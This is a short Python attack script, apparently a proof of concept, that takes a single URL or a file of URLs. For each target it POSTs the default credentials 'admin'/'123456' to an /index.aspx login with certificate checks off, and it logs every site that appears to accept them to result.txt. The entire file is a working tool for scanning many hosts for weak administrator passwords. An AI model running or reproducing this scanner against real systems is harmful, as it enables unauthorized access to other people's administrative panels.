#-*- coding: utf-8 -*-
import argparse,sys,requests,time,os,re
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()



def banner():
    test = """
        88888888888                                                     .d888 888    888b     d888                   
            888                                                        d88P"  888    8888b   d8888                   
            888                                                        888    888    88888b.d88888                   
            888   8888b.  88888b.   8888b.   .d88b.  .d8888b   .d88b.  888888 888888 888Y88888P888 .d8888b   .d88b.  
            888      "88b 888 "88b     "88b d88""88b 88K      d88""88b 888    888    888 Y888P 888 88K      d88P"88b 
            888  .d888888 888  888 .d888888 888  888 "Y8888b. 888  888 888    888    888  Y8P  888 "Y8888b. 888  888 
            888  888  888 888  888 888  888 Y88..88P      X88 Y88..88P 888    Y88b.  888   "   888      X88 Y88b 888 
            888  "Y888888 888  888 "Y888888  "Y88P"   88888P'  "Y88P"  888     "Y888 888       888  88888P'  "Y88888 
                                                                                                                 888 
                                                                                                            Y8b d88P 
                                                                                                             "Y88P"  
                                                                                                 @author: MiCo-in            
                                                                                                             
    """
    print(test)
headers={
    "User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
}


def poc(target):
    url = target + "/index.aspx"
    headers = {
        "User-Agent": 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36 Edg/116.0.1938.54'
    }
    json = {
        "txturname" :" admin" ,
        "txtpwe" : "123456",
    }
    try:
        res = requests.post(url, headers=headers, json=json, verify=False, timeout=5).text
        if "href" in res:
            print(f"[+] {target} is valueable [admin : 123456]")
            with open("result.txt", "a+", encoding="utf-8") as f:
                f.write(target + "\n")
        else:
            print(f"[-] {target} is not ")
    except:
        print(f"[*] {target} error")



def main():
    banner()
    parser = argparse.ArgumentParser(description='canal admin weak Password')
    parser.add_argument("-u", "--url", dest="url", type=str, help=" example: http://www.example.com")
    parser.add_argument("-f", "--file", dest="file", type=str, help=" urls.txt")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif not args.url and args.file:
        url_list=[]
        with open(args.file,"r",encoding="utf-8") as f:
            for url in f.readlines():
                url_list.append(url.strip().replace("\n",""))
        for j in url_list:
            poc(j)
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")







if __name__ == "__main__":
    # banner()
    main()